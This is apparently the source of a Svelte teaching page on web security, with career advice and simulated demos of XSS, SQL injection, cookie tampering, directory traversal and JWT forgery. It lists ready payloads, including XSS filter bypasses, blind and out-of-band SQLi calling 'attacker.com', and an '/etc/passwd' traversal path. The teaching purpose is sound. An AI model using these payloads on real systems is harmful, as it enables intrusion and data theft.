
<script lang="ts">
	import { onMount } from 'svelte';
	import MediumCard from '../components/MediumCard.svelte';
	import Header from '../components/Header.svelte';
	import LongCard from '../components/LongCard.svelte';
	import SmallCard from '../components/SmallCard.svelte';
	import { fade } from 'svelte/transition';

	let images = Array.from({ length: 24 }, (_, i) => `${i + 1}.png`);
	let doubledImages = [...images, ...images, ...images];
	let textVisible = false;

	// Function to generate random delays between min and max (in seconds)
	function getRandomDelay(min: number, max: number) {
		return Math.random() * (max - min) + min;
	}

	function shuffleArray(array: string[]) {
		for (let i = array.length - 1; i > 0; i--) {
			const j = Math.floor(Math.random() * (i + 1));
			[array[i], array[j]] = [array[j], array[i]];
		}
		return array;
	}

	let steps = [
		{
			header: 'Technical Education Path',
			description:
				'Earn a degree in Computer Science, Information Technology, or Cybersecurity. Supplement with certifications like CompTIA Security+, CEH (Certified Ethical Hacker), or CISSP. Build hands-on skills through CTF (Capture The Flag) competitions and home lab environments.',
			image:
				'https://www.gettingsmart.com/wp-content/uploads/2018/03/Competency-Based-Education.jpg'
		},
		{
			header: 'IT Professional Transition',
			description:
				'Start in an IT support or network administration role. Gradually take on security-related responsibilities. Earn security certifications while gaining practical experience. Transition to roles like Security Analyst or SOC (Security Operations Center) Technician.',
			image:
				'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS1ihDy9z8L7GCw2HXGsYMwwnsWMdWtWQlpkfZdjIodByksSI7Ixpk7NLCNBqd1pC0y8s8&usqp=CAU'
		},
		{
			header: 'Self-Taught/Bootcamp Route',
			description:
				'Leverage free resources (TryHackMe, Hack The Box, Cybrary) and coding bootcamps. Build a portfolio of security projects and vulnerability reports. Network through cybersecurity communities and conferences to find entry-level opportunities.',
			image: 'https://www.bluezebracreative.com/wp-content/uploads/2018/07/self-taught.jpg'
		}
	];

	let jwtToken = '';
	let jwtSecret = 'your-256-bit-secret';
	let jwtModifiedToken = '';
	let jwtResult = '';
	let jwtAlgorithm = 'HS256';
	let isJwtSafeMode = true;

	// Sample JWT (Header: {"alg":"HS256","typ":"JWT"}, Payload: {"sub":"1234567890","name":"John Doe","admin":false})
	const sampleToken =
		'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOmZhbHNlfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';

	function tryJWT() {
		if (!jwtToken) return;

		try {
			const [header, payload, signature] = jwtToken.split('.');
			const decodedHeader = JSON.parse(atob(header));
			const decodedPayload = JSON.parse(atob(payload));

			if (isJwtSafeMode) {
				// Safe mode - just show decoded contents
				jwtResult =
					`🔐 Token Analysis (Safe Mode):\n\n` +
					`Header: ${JSON.stringify(decodedHeader, null, 2)}\n\n` +
					`Payload: ${JSON.stringify(decodedPayload, null, 2)}\n\n` +
					`Algorithm: ${decodedHeader.alg}\n\n` +
					`⚠️ In unsafe mode, you could try modifying these values!`;
			} else {
				// Unsafe mode simulation
				if (decodedHeader.alg === 'none') {
					jwtResult =
						`💀 None Algorithm Attack Successful!\n\n` +
						`Token with no verification accepted:\n${jwtToken}\n\n` +
						`Admin access granted! (Payload modified to {"admin":true})`;
				} else if (decodedHeader.alg === 'HS256' && jwtModifiedToken) {
					jwtResult =
						`💀 HMAC Key Confusion Attack!\n\n` +
						`Used public key as HMAC secret to forge token:\n${jwtModifiedToken}\n\n` +
						`Admin privileges obtained!`;
				} else {
					jwtResult =
						`🔐 Valid Token Contents:\n\n` +
						`Header: ${JSON.stringify(decodedHeader, null, 2)}\n\n` +
						`Payload: ${JSON.stringify(decodedPayload, null, 2)}`;
				}
			}
		} catch (e) {
			jwtResult = `❌ Invalid JWT: ${e.message}`;
		}
	}

	function modifyJWT() {
		if (!jwtToken) return;

		try {
			const [header, payload, signature] = jwtToken.split('.');
			const decodedPayload = JSON.parse(atob(payload));

			// Modify the payload to escalate privileges
			decodedPayload.admin = true;
			const newPayload = btoa(JSON.stringify(decodedPayload));

			jwtModifiedToken = `${header}.${newPayload}.${signature}`;
			jwtResult =
				`✏️ Modified Token (No Valid Signature):\n${jwtModifiedToken}\n\n` +
				`Try using this in "None Algorithm" or "Key Confusion" attacks`;
		} catch (e) {
			jwtResult = `❌ Error modifying JWT: ${e.message}`;
		}
	}

	function resetJWT() {
		jwtToken = sampleToken;
		jwtModifiedToken = '';
		jwtResult = '';
	}

	function loadSampleToken() {
		jwtToken = sampleToken;
	}

	images = shuffleArray(doubledImages);

	// Directory Traversal Demo Variables
	let filePath = '../../etc/passwd';
	let traversalResult = '';
	let isSafeMode = true;

	function tryTraversal() {
		if (!filePath) return;

		const baseDir = '/var/www/secure/';
		const fullPath = new URL(filePath, 'file://' + baseDir).pathname;

		if (isSafeMode) {
			// Safe mode - just show what would happen
			if (filePath.includes('../')) {
				traversalResult =
					`🚨 Blocked traversal attempt!\n\n` +
					`Attempted path: ${filePath}\n` +
					`Would have accessed: ${fullPath}\n\n` +
					`This would expose sensitive files in a real system!`;
			} else {
				traversalResult = `✅ Safe file accessed: ${filePath}`;
			}
		} else {
			// Unsafe mode simulation
			if (filePath.includes('../')) {
				traversalResult =
					`💀 Directory Traversal Successful!\n\n` +
					`Exposed file: ${fullPath}\n\n` +
					`File content:\nroot:x:0:0:root:/root:/bin/bash\n` +
					`daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n` +
					`... [sensitive system file contents]`;
			} else {
				traversalResult = `✅ Safe file accessed: ${filePath}`;
			}
		}
	}

	function resetTraversal() {
		filePath = '../../etc/passwd';
		traversalResult = '';
	}

	// Assign a random delay to each image (between 0.1s and 1s)
	let imageDelays = images.map(() => getRandomDelay(0.5, 1.5));

	let cards = [
		{
			header: 'XSS (Cross-Site Scripting)',
			description:
				"A vulnerability where attackers inject client-side scripts into web pages viewed by other users. The malicious code executes in the victim's browser context, allowing session hijacking, defacement, or redirection to phishing sites."
		},
		{
			header: 'SQL Injection',
			description:
				'An attack technique where malicious SQL statements are inserted into an entry field for execution. This allows attackers to read, modify, or delete database contents, bypass authentication, or execute administrative operations.'
		},
		{
			header: 'Cookie Tampering',
			description:
				'The practice of modifying client-side cookies to gain unauthorized privileges or impersonate other users. Attackers exploit improperly secured cookies to bypass authentication or elevate permissions.'
		},
		{
			header: 'Directory Traversal',
			description:
				'An HTTP exploit allowing access to restricted directories and files outside the web root folder. Attackers manipulate file paths to access sensitive system files, configuration data, or source code.'
		},
		{
			header: 'JWT (JSON Web Token) Vulnerabilities',
			description:
				'Security flaws in JWT implementation that allow token forgery or manipulation. Common issues include accepting unsigned tokens, weak secret keys, or failing to validate token claims properly.'
		}
	];

	let expandedIndex: number | null = 0;

	let vulHeader: string = cards[0].header;

	function toggleCard(index: number, header: string) {
		expandedIndex = expandedIndex === index ? null : index;
		vulHeader = header;
	}

	// Add these to your existing script section
	let xssPayload = '';

	function tryXSS() {
		// Define different XSS patterns
		const patterns = [
			{ type: 'Script Tag Injection', regex: /<script>(.*?)<\/script>/i },
			{ type: 'Image Tag Injection', regex: /<img[^>]+onerror\s*=\s*["']?alert\((.*?)\)["']?/i },
			{ type: 'SVG Injection', regex: /<svg[^>]+onload\s*=\s*["']?alert\((.*?)\)["']?/i },
			{ type: 'JS Protocol Injection', regex: /javascript:\s*alert\((.*?)\)/i },
			{ type: 'HTML Tag Injection', regex: /">(.*?)<\/script>/i },
			{ type: 'Attribute Injection', regex: /["']\s*onmouseover\s*=\s*["']?alert\((.*?)\)/i },
			{ type: 'JS Block Injection', regex: /; alert\((.*?)\); var x=/i },
			{ type: 'HTML Entity Encoding', regex: /&#x3C;script&#x3E;(.*?)&#x3C;\/script&#x3E;/i },
			{ type: 'URL Encoding', regex: /%3Cscript%3E(.*?)%3C\/script%3E/i },
			{ type: 'DOM-Based XSS', regex: /#<img[^>]+onerror\s*=\s*["']?alert\((.*?)\)["']?/i },
			{ type: 'Case Variation Bypass', regex: /<sCript>(.*?)<\/sCript>/i }
		];

		// Loop through patterns and check if any match
		for (const pattern of patterns) {
			const match = xssPayload.match(pattern.regex);
			if (match && match[1]) {
				alert(`Detected ${pattern.type}: ${match[1]}`);
				return;
			}
		}

		alert('No XSS detected!');
	}

	let sqlUsername = '';
	let sqlPassword = '';
	let sqlResult = '';

	function trySQLi() {
		// Simulate vulnerable SQL query
		const fakeQuery = `SELECT * FROM users WHERE username='${sqlUsername}' AND password='${sqlPassword}'`;

		// Check for common SQLi patterns
		if (sqlUsername.includes("'--") || sqlUsername.includes("' OR '1'='1")) {
			sqlResult =
				'✅ Login successful (bypassed authentication)\n\n' +
				'Executed query:\n' +
				fakeQuery +
				'\n\n⚠️ This demonstrates a real SQL injection vulnerability';
		} else if (sqlUsername.includes("';")) {
			sqlResult = '🚨 Database error returned (potential SQLi vulnerability detected)';
		} else {
			sqlResult = '❌ Login failed\n\n' + 'Executed query:\n' + fakeQuery;
		}
	}

	type Cookies = {
		role?: string;
		[key: string]: string | undefined;
	};

	let cookies: Cookies = {};
	let cookieName = '';
	let cookieValue = '';
	let currentRole = '';

	// Set cookie in demo
	function setCookie() {
		cookies = { ...cookies, [cookieName]: cookieValue };
		cookieName = '';
		cookieValue = '';
		checkRole();
	}

	// Demo actions
	function loginAsUser() {
		cookies = { sessionId: 'user_1234', role: 'user' };
		checkRole();
	}

	function loginAsAdmin() {
		cookies = { sessionId: 'admin_5678', role: 'admin' };
		checkRole();
	}

	function clearCookies() {
		cookies = {};
		currentRole = cookies.role || 'guest';
	}

	// Check current role from cookies
	function checkRole() {
		currentRole = cookies['role'] || 'guest';
	}

	onMount(() => {
		// Show text after the maximum possible delay (1s) plus some buffer
		setTimeout(() => {
			textVisible = true;
		}, 1500); // 1.5 seconds to ensure all animations are likely done
	});
</script>

<main class="roboto zin-50">
	<!-- splash section -->
	<section class="relative h-screen overflow-hidden">
		<div class="grid grid-cols-2 gap-6 p-2 lg:grid-cols-6">
			{#each images as img, i}
				<img
					src={`/news/${img}`}
					alt={`Image ${img}`}
					class="pop-up h-auto w-full rounded-lg object-cover shadow-lg transition-transform duration-300 hover:scale-105"
					style="--delay: {imageDelays[i]}s"
				/>
			{/each}
		</div>
		<div
			class="absolute top-1/2 left-1/2 flex w-full -translate-x-1/2 -translate-y-1/2 flex-col items-center justify-center text-center text-6xl font-black uppercase lg:text-9xl"
			class:opacity-0={!textVisible}
			class:animate-fade-in={textVisible}
		>
			<span class="text-stroke">surrounded by</span>
			<span class="text-stroke">cyber attacks</span>
		</div>
	</section>

	<!-- why cyber security is important -->
	<section class="flex min-h-screen flex-col p-8">
		<Header header="why cyber security" direction="start" />

		<div class="mt-4 flex flex-col items-center gap-4 p-4">
			<LongCard
				header="Protects Sensitive Data"
				direction="start"
				description="In the digital world, data is one of the most valuable assets. Cybersecurity helps protect personal, financial, and business information from hackers, preventing data breaches and unauthorized access."
				image="sensitive_data.svg"
			/>
			<LongCard
				header="Prevents Financial Loss"
				direction="end"
				description="Cyber attacks like ransomware, phishing, and fraud can cause severe financial damage to individuals and businesses. Strong cybersecurity measures help prevent these losses by securing transactions and sensitive data."
				image="financial.svg"
			/>
			<LongCard
				header="Ensures Privacy & Trust"
				direction="start"
				description="In an era of increasing cyber threats, protecting user privacy is essential. Strong security practices help maintain customer trust, ensuring that personal data remains safe and confidential."
				image="privacy.svg"
			/>
			<LongCard
				header="Protects Critical Infrastructure"
				direction="end"
				description="Many essential services, including healthcare, finance, and energy, rely on digital systems. Cybersecurity ensures the safety of these infrastructures, preventing disruptions and large-scale damages."
				image="secure.svg"
			/>
		</div>
	</section>

	<!-- learn it yourself -->
	<section class="flex min-h-screen flex-col p-8">
		<Header header="learn by doing" direction="end" />

		<section class="flex h-full w-full flex-row gap-4 p-4">
			<div class="h-[44rem] w-[70%] overflow-auto rounded-2xl border-[1px] px-4 py-2 shadow-lg">
				<div class="flex flex-col gap-1">
					<div>
						<span class="text-2xl font-bold">{vulHeader}</span>
						<div class="h-1 w-32 rounded-xl bg-black"></div>
					</div>

					<div>
						{#if vulHeader === 'XSS (Cross-Site Scripting)'}
							<div transition:fade class="flex flex-col gap-4 p-1">
								<div class="flex flex-col gap-2">
									<span class="text-xl font-semibold">How to test for XSS Vulnerabilities</span>
									<div class="flex flex-col space-y-4 rounded-lg px-2">
										<!-- Step 1 -->
										<div class="flex flex-col">
											<span class="font-bold text-gray-800">1. Identify Input Points:</span>
											<span class="px-4 text-gray-600">
												Look for all user-input fields (search bars, comment forms, contact forms,
												URL parameters)
											</span>
										</div>

										<!-- Step 2 -->
										<div class="flex flex-col">
											<span class="font-bold text-gray-800">2. Test Basic Payloads:</span>
											<span class="px-4 text-gray-600">
												Try simple alerts like <code class="rounded bg-gray-200 px-1 font-mono"
													>&lt;script&gt;alert(1)&lt;/script&gt;</code
												> in each input
											</span>
										</div>

										<!-- Step 3 -->
										<div class="flex flex-col">
											<span class="font-bold text-gray-800">3. Try Alternative Vectors:</span>
											<div class="px-4 text-gray-600">
												If script tags are blocked, test:
												<ul class="mt-1 list-disc space-y-1 pl-6">
													<li>
														<code class="rounded bg-gray-200 px-1 font-mono"
															>&lt;img src=x onerror=alert(1)&gt;</code
														>
													</li>
													<li>
														<code class="rounded bg-gray-200 px-1 font-mono"
															>&lt;svg onload=alert(1)&gt;</code
														>
													</li>
													<li>
														<code class="rounded bg-gray-200 px-1 font-mono"
															>javascript:alert(1)</code
														> in href attributes
													</li>
												</ul>
											</div>
										</div>

										<!-- Step 4 -->
										<div class="flex flex-col">
											<span class="font-bold text-gray-800">4. Check Context Awareness:</span>
											<div class="px-4 text-gray-600">
												Test how input is rendered in different contexts:
												<ul class="mt-1 list-disc space-y-1 pl-6">
													<li>
														Inside HTML tags: <code class="rounded bg-gray-200 px-1 font-mono"
															>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code
														>
													</li>
													<li>
														In HTML attributes: <code class="rounded bg-gray-200 px-1 font-mono"
															>" onmouseover="alert(1)</code
														>
													</li>
													<li>
														In JavaScript blocks: <code class="rounded bg-gray-200 px-1 font-mono"
															>'; alert(1); var x='</code
														>
													</li>
												</ul>
											</div>
										</div>

										<!-- Step 5 -->
										<div class="flex flex-col">
											<span class="font-bold text-gray-800">5. Test Encoding Bypasses:</span>
											<div class="px-4 text-gray-600">
												Try URL encoding, HTML encoding, or Unicode:
												<ul class="mt-1 list-disc space-y-1 pl-6">
													<li>
														<code class="rounded bg-gray-200 px-1 font-mono"
															>&amp;#x3C;script&amp;#x3E;alert(1)&amp;#x3C;/script&amp;#x3E;</code
														>
													</li>
													<li>
														<code class="rounded bg-gray-200 px-1 font-mono"
															>%3Cscript%3Ealert(1)%3C/script%3E</code
														>
													</li>
												</ul>
											</div>
										</div>

										<!-- Step 6 -->
										<div class="flex flex-col">
											<span class="font-bold text-gray-800">6. Verify Persistent XSS:</span>
											<span class="px-4 text-gray-600">
												Check if payloads are stored and execute for other users (comments,
												profiles)
											</span>
										</div>

										<!-- Step 7 -->
										<div class="flex flex-col">
											<span class="font-bold text-gray-800">7. Test DOM-Based XSS:</span>
											<span class="px-4 text-gray-600">
												Manipulate URL fragments/hashes like <code
													class="rounded bg-gray-200 px-1 font-mono"
													>#&lt;img src=x onerror=alert(1)&gt;</code
												>
											</span>
										</div>

										<!-- Step 8 -->
										<div class="flex flex-col">
											<span class="font-bold text-gray-800">8. Check Filter Bypasses:</span>
											<div class="px-4 text-gray-600">
												Try case variation (<code class="rounded bg-gray-200 px-1 font-mono"
													>&lt;sCript&gt;</code
												>), null bytes, or broken tags
											</div>
										</div>

										<!-- Step 9 -->
										<div class="flex flex-col">
											<span class="font-bold text-gray-800">9. Verify Security Headers:</span>
											<span class="px-4 text-gray-600">
												Check if CSP headers block your payloads
											</span>
										</div>

										<!-- Step 10 -->
										<div class="flex flex-col">
											<span class="font-bold text-gray-800">10. Document Findings:</span>
											<span class="px-4 text-gray-600">
												Record all vulnerable endpoints and successful payloads
											</span>
										</div>
									</div>
								</div>

								<div class="flex flex-col gap-2">
									<span class="text-xl font-semibold">Try it out...</span>

									<div class="flex flex-col gap-2 rounded-lg border p-4">
										<div class="flex flex-row gap-2 px-2">
											<input
												type="text"
												class="w-full rounded-lg border p-2"
												bind:value={xssPayload}
												placeholder="Enter XSS payload here"
											/>
											<button class="w-24 rounded-lg border hover:bg-zinc-100" on:click={tryXSS}
												>try</button
											>
										</div>

										<div class="mt-2 text-sm text-gray-500">
											Try: <code class="rounded bg-gray-200 px-1"
												>{`<script>alert(1)</script>`}</code
											>
											or
											<code class="rounded bg-gray-200 px-1">' OR '1'='1</code>
										</div>
									</div>
								</div>

								<div class="flex flex-col gap-2">
									<span class="text-xl font-semibold">Why You Should Protect Against XSS</span>

									<div class="space-y-4">
										<!-- Point 1 -->
										<div class="flex items-center gap-3">
											<div
												class="flex h-10 w-10 items-center justify-center rounded-full bg-red-500 text-lg font-bold text-white"
											>
												1
											</div>
											<div>
												<span class="text-lg font-medium text-gray-700">User Data Theft</span>
												<p class="text-gray-600">
													XSS attacks allow hackers to steal user data such as login credentials,
													session cookies, and personal information, leading to account hijacking.
												</p>
											</div>
										</div>

										<!-- Point 2 -->
										<div class="flex items-center gap-3">
											<div
												class="flex h-10 w-10 items-center justify-center rounded-full bg-red-500 text-lg font-bold text-white"
											>
												2
											</div>
											<div>
												<span class="text-lg font-medium text-gray-700">Malicious Redirects</span>
												<p class="text-gray-600">
													Attackers can inject scripts to redirect users to phishing websites,
													tricking them into providing sensitive information or downloading malware.
												</p>
											</div>
										</div>

										<!-- Point 3 -->
										<div class="flex items-center gap-3">
											<div
												class="flex h-10 w-10 items-center justify-center rounded-full bg-red-500 text-lg font-bold text-white"
											>
												3
											</div>
											<div>
												<span class="text-lg font-medium text-gray-700"
													>Reputation & Trust Damage</span
												>
												<p class="text-gray-600">
													A website compromised by XSS can lose user trust, leading to decreased
													engagement, financial losses, and legal consequences due to data breaches.
												</p>
											</div>
										</div>
									</div>
								</div>

								<div class="flex flex-col gap-2">
									<span class="text-xl font-semibold">How XSS has hit the world</span>
									<div class="flex w-full flex-row items-center justify-center gap-4">
										<a
											href="https://www.techrepublic.com/article/british-airways-data-theft-demonstrates-need-for-cross-site-scripting-restrictions/"
											class=""
										>
											<img
												src="/try/xss/british.png"
												alt=""
												class="border-xl h-56 rounded-xl border-2"
											/>
										</a>
										<a
											href="https://portswigger.net/daily-swig/xss-slip-up-exposed-fortnite-gamers-to-account-hijack"
										>
											<img
												src="/try/xss/fortnite.png"
												alt=""
												class="border-xl h-56 rounded-xl border-2"
											/>
										</a>
									</div>
								</div>
							</div>
						{:else if vulHeader === 'SQL Injection'}
							<div transition:fade class="flex flex-col gap-4 p-1">
								<!-- SQL Injection Testing Guide -->
								<div class="flex flex-col gap-2">
									<span class="text-xl font-semibold"
										>How to test for SQL Injection Vulnerabilities</span
									>
									<div class="flex flex-col space-y-4 rounded-lg px-2">
										<!-- Step 1 -->
										<div class="flex flex-col">
											<span class="font-bold text-gray-800">1. Identify Database Input Points:</span
											>
											<span class="px-4 text-gray-600">
												Look for login forms, search fields, URL parameters, and any inputs that
												might interact with a database
											</span>
										</div>

										<!-- Step 2 -->
										<div class="flex flex-col">
											<span class="font-bold text-gray-800">2. Test Basic Injection Strings:</span>
											<span class="px-4 text-gray-600">
												Try simple payloads like <code class="rounded bg-gray-200 px-1 font-mono"
													>' OR '1'='1</code
												>
												or <code class="rounded bg-gray-200 px-1 font-mono">" OR "" = "</code>
											</span>
										</div>

										<!-- Step 3 -->
										<div class="flex flex-col">
											<span class="font-bold text-gray-800">3. Test for Error-Based SQLi:</span>
											<div class="px-4 text-gray-600">
												Attempt to force database errors:
												<ul class="mt-1 list-disc space-y-1 pl-6">
													<li>
														<code class="rounded bg-gray-200 px-1 font-mono"
															>' AND 1=CONVERT(int,@@version)--</code
														>
													</li>
													<li>
														<code class="rounded bg-gray-200 px-1 font-mono"
															>' AND 1=1 UNION SELECT 1,table_name FROM information_schema.tables--</code
														>
													</li>
												</ul>
											</div>
										</div>

										<!-- Step 4 -->
										<div class="flex flex-col">
											<span class="font-bold text-gray-800">4. Test for Blind SQLi:</span>
											<div class="px-4 text-gray-600">
												Check for time-based or boolean-based vulnerabilities:
												<ul class="mt-1 list-disc space-y-1 pl-6">
													<li>
														<code class="rounded bg-gray-200 px-1 font-mono"
															>' AND 1=IF(SUBSTRING(@@version,1,1)=5,SLEEP(5),0)--</code
														>
													</li>
													<li>
														<code class="rounded bg-gray-200 px-1 font-mono">' OR 1=1--</code> vs
														<code class="rounded bg-gray-200 px-1 font-mono">' OR 1=0--</code>
													</li>
												</ul>
											</div>
										</div>

										<!-- Step 5 -->
										<div class="flex flex-col">
											<span class="font-bold text-gray-800">5. Test for Out-of-Band SQLi:</span>
											<div class="px-4 text-gray-600">
												Attempt DNS or HTTP requests:
												<ul class="mt-1 list-disc space-y-1 pl-6">
													<li>
														<code class="rounded bg-gray-200 px-1 font-mono"
															>'; EXEC master..xp_dirtree '\\attacker.com\share'--</code
														>
													</li>
												</ul>
											</div>
										</div>
									</div>
								</div>

								<!-- SQL Injection Demo -->
								<div class="flex flex-col gap-2">
									<span class="text-xl font-semibold">Try it out...</span>
									<div class="flex flex-col gap-2 rounded-lg border p-4">
										<div class="flex flex-row gap-2">
											<input
												type="text"
												class="w-full rounded-lg border p-2"
												bind:value={sqlUsername}
												placeholder="Username"
											/>
											<input
												type="password"
												class="w-full rounded-lg border p-2"
												bind:value={sqlPassword}
												placeholder="Password"
											/>
											<button class="w-24 rounded-lg border hover:bg-zinc-100" on:click={trySQLi}>
												Login
											</button>
										</div>

										<!-- Demo Results -->
										{#if sqlResult}
											<div class="mt-2 rounded border bg-gray-50 p-2">
												<p class="font-mono text-sm">{sqlResult}</p>
											</div>
										{/if}

										<!-- Sample Payloads -->
										<div class="mt-2 text-sm text-gray-500">
											Try: <code class="rounded bg-gray-200 px-1">admin'--</code> or
											<code class="rounded bg-gray-200 px-1">' OR '1'='1</code>
										</div>
									</div>
								</div>

								<!-- Why Protect Against SQLi -->
								<div class="flex flex-col gap-2">
									<span class="text-xl font-semibold"
										>Why You Should Protect Against SQL Injection</span
									>
									<div class="space-y-4">
										<!-- Point 1 -->
										<div class="flex items-center gap-3">
											<div
												class="flex h-10 w-10 items-center justify-center rounded-full bg-red-500 text-lg font-bold text-white"
											>
												1
											</div>
											<div>
												<span class="text-lg font-medium text-gray-700">Data Breaches</span>
												<p class="text-gray-600">
													SQLi can expose entire databases, including user credentials, personal
													information, payment details, and sensitive business data.
												</p>
											</div>
										</div>

										<!-- Point 2 -->
										<div class="flex items-center gap-3">
											<div
												class="flex h-10 w-10 items-center justify-center rounded-full bg-red-500 text-lg font-bold text-white"
											>
												2
											</div>
											<div>
												<span class="text-lg font-medium text-gray-700">Data Manipulation</span>
												<p class="text-gray-600">
													Attackers can modify, delete, or corrupt database contents, potentially
													destroying business-critical information.
												</p>
											</div>
										</div>

										<!-- Point 3 -->
										<div class="flex items-center gap-3">
											<div
												class="flex h-10 w-10 items-center justify-center rounded-full bg-red-500 text-lg font-bold text-white"
											>
												3
											</div>
											<div>
												<span class="text-lg font-medium text-gray-700">Administrative Access</span>
												<p class="text-gray-600">
													Successful SQLi can lead to complete system compromise, allowing attackers
													to execute commands on the database server.
												</p>
											</div>
										</div>
									</div>
								</div>

								<!-- Real-World Examples -->
								<div class="flex flex-col gap-2">
									<span class="text-xl font-semibold">SQL Injection in the News</span>
									<div class="flex w-full flex-row items-center justify-center gap-4">
										<a
											href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1636"
										>
											<img
												src="/try/sqli/pic1.png"
												alt=""
												class="border-xl h-56 rounded-xl border-2"
											/>
										</a>
										<a href="https://nvd.nist.gov/vuln/detail/CVE-2018-15441">
											<img
												src="/try/sqli/pic2.png"
												alt=""
												class="border-xl h-56 rounded-xl border-2"
											/>
										</a>
									</div>
								</div>
							</div>
						{:else if vulHeader === 'Cookie Tampering'}
							<div transition:fade class="flex flex-col gap-4 p-1">
								<div class="flex flex-col gap-2">
									<span class="text-xl font-semibold">How to test for Cookie Vulnerabilities</span>
									<div class="flex flex-col space-y-4 rounded-lg px-2">
										<!-- Step 1 -->
										<div class="flex flex-col">
											<span class="font-bold text-gray-800"
												>1. Identify Authentication Cookies:</span
											>
											<span class="px-4 text-gray-600">
												Look for cookies like <code class="rounded bg-gray-200 px-1 font-mono"
													>sessionID</code
												>, <code class="rounded bg-gray-200 px-1 font-mono">authToken</code>, or
												<code class="rounded bg-gray-200 px-1 font-mono">isAdmin</code> in Developer
												Tools (F12 > Application > Cookies)
											</span>
										</div>

										<!-- Step 2 -->
										<div class="flex flex-col">
											<span class="font-bold text-gray-800">2. Test Cookie Modification:</span>
											<div class="px-4 text-gray-600">
												Try editing cookie values directly:
												<ul class="mt-1 list-disc space-y-1 pl-6">
													<li>
														Change <code class="rounded bg-gray-200 px-1 font-mono"
															>userRole=guest</code
														>
														to
														<code class="rounded bg-gray-200 px-1 font-mono">userRole=admin</code>
													</li>
													<li>
														Modify <code class="rounded bg-gray-200 px-1 font-mono"
															>isLoggedIn=0</code
														>
														to <code class="rounded bg-gray-200 px-1 font-mono">isLoggedIn=1</code>
													</li>
												</ul>
											</div>
										</div>

										<!-- Step 3 -->
										<div class="flex flex-col">
											<span class="font-bold text-gray-800">3. Check Cookie Security Flags:</span>
											<div class="px-4 text-gray-600">
												Verify if cookies lack essential protections:
												<ul class="mt-1 list-disc space-y-1 pl-6">
													<li>
														<code class="rounded bg-gray-200 px-1 font-mono">HttpOnly</code> (blocks
														JavaScript access)
													</li>
													<li>
														<code class="rounded bg-gray-200 px-1 font-mono">Secure</code> (HTTPS-only)
													</li>
													<li>
														<code class="rounded bg-gray-200 px-1 font-mono">SameSite</code> (prevents
														CSRF)
													</li>
												</ul>
											</div>
										</div>

										<!-- Step 4 -->
										<div class="flex flex-col">
											<span class="font-bold text-gray-800">4. Test Session Fixation:</span>
											<span class="px-4 text-gray-600">
												Attempt to set your own session cookie value before authentication
											</span>
										</div>

										<!-- Step 5 -->
										<div class="flex flex-col">
											<span class="font-bold text-gray-800">5. Check Cookie Expiration:</span>
											<span class="px-4 text-gray-600">
												Verify if session cookies expire properly after logout or timeouts
											</span>
										</div>
									</div>
								</div>

								<!-- Cookie Tampering Demo -->
								<div class="flex flex-col gap-2">
									<span class="text-xl font-semibold">Try it out...</span>
									<div class="flex flex-col gap-4 rounded-lg border p-4">
										<!-- Current Cookies Display -->
										<div class="flex flex-col gap-2">
											<span class="font-medium">Current Cookies:</span>
											<div class="rounded border bg-gray-50 p-2 font-mono text-sm">
												{#if Object.entries(cookies).length > 0}
													{#each Object.entries(cookies) as [key, value]}
														<div>{key} = {value}</div>
													{/each}
												{:else}
													<div class="text-gray-400">No cookies set</div>
												{/if}
											</div>
										</div>

										<!-- Cookie Editor -->
										<div class="flex flex-col gap-2">
											<span class="font-medium">Edit Cookies:</span>
											<div class="flex flex-row gap-2">
												<input
													type="text"
													class="w-full rounded-lg border p-2"
													bind:value={cookieName}
													placeholder="Cookie name"
												/>
												<input
													type="text"
													class="w-full rounded-lg border p-2"
													bind:value={cookieValue}
													placeholder="Value"
												/>
												<button
													class="w-24 rounded-lg border hover:bg-zinc-100"
													on:click={setCookie}
												>
													Set
												</button>
											</div>
										</div>

										<!-- Demo Actions -->
										<div class="flex flex-row gap-2">
											<button
												class="flex-1 rounded-lg border hover:bg-zinc-100"
												on:click={loginAsUser}
											>
												Login as User
											</button>
											<button
												class="flex-1 rounded-lg border hover:bg-zinc-100"
												on:click={loginAsAdmin}
											>
												Login as Admin
											</button>
											<button
												class="flex-1 rounded-lg border hover:bg-zinc-100"
												on:click={clearCookies}
											>
												Clear All
											</button>
										</div>

										<!-- Demo Status -->
										{#if currentRole}
											<div
												class="mt-2 rounded border p-2 text-center font-medium"
												class:bg-green-100={currentRole === 'admin'}
												class:bg-blue-100={currentRole === 'user'}
											>
												Current Role: <span class="font-bold uppercase">{currentRole}</span>
											</div>
										{/if}
									</div>
								</div>

								<!-- Why Protect Against Cookie Tampering -->
								<div class="flex flex-col gap-2">
									<span class="text-xl font-semibold">Why Cookie Security Matters</span>
									<div class="space-y-4">
										<!-- Point 1 -->
										<div class="flex items-center gap-3">
											<div
												class="flex h-10 w-10 items-center justify-center rounded-full bg-red-500 text-lg font-bold text-white"
											>
												1
											</div>
											<div>
												<span class="text-lg font-medium text-gray-700">Authentication Bypass</span>
												<p class="text-gray-600">
													Attackers can elevate privileges by modifying <code
														class="rounded bg-gray-200 px-1">isAdmin</code
													> or similar flags, gaining unauthorized access.
												</p>
											</div>
										</div>

										<!-- Point 2 -->
										<div class="flex items-center gap-3">
											<div
												class="flex h-10 w-10 items-center justify-center rounded-full bg-red-500 text-lg font-bold text-white"
											>
												2
											</div>
											<div>
												<span class="text-lg font-medium text-gray-700">Session Hijacking</span>
												<p class="text-gray-600">
													Stolen cookies allow attackers to impersonate legitimate users without
													needing passwords.
												</p>
											</div>
										</div>

										<!-- Point 3 -->
										<div class="flex items-center gap-3">
											<div
												class="flex h-10 w-10 items-center justify-center rounded-full bg-red-500 text-lg font-bold text-white"
											>
												3
											</div>
											<div>
												<span class="text-lg font-medium text-gray-700">Data Exposure</span>
												<p class="text-gray-600">
													Sensitive information stored in cookies (emails, user IDs) can be stolen
													via XSS or sniffing attacks.
												</p>
											</div>
										</div>
									</div>
								</div>

								<!-- Real-World Examples -->
								<div class="flex flex-col gap-2">
									<span class="text-xl font-semibold">Cookie Attacks in the News</span>
									<div class="flex w-full flex-row items-center justify-center gap-4">
										<a
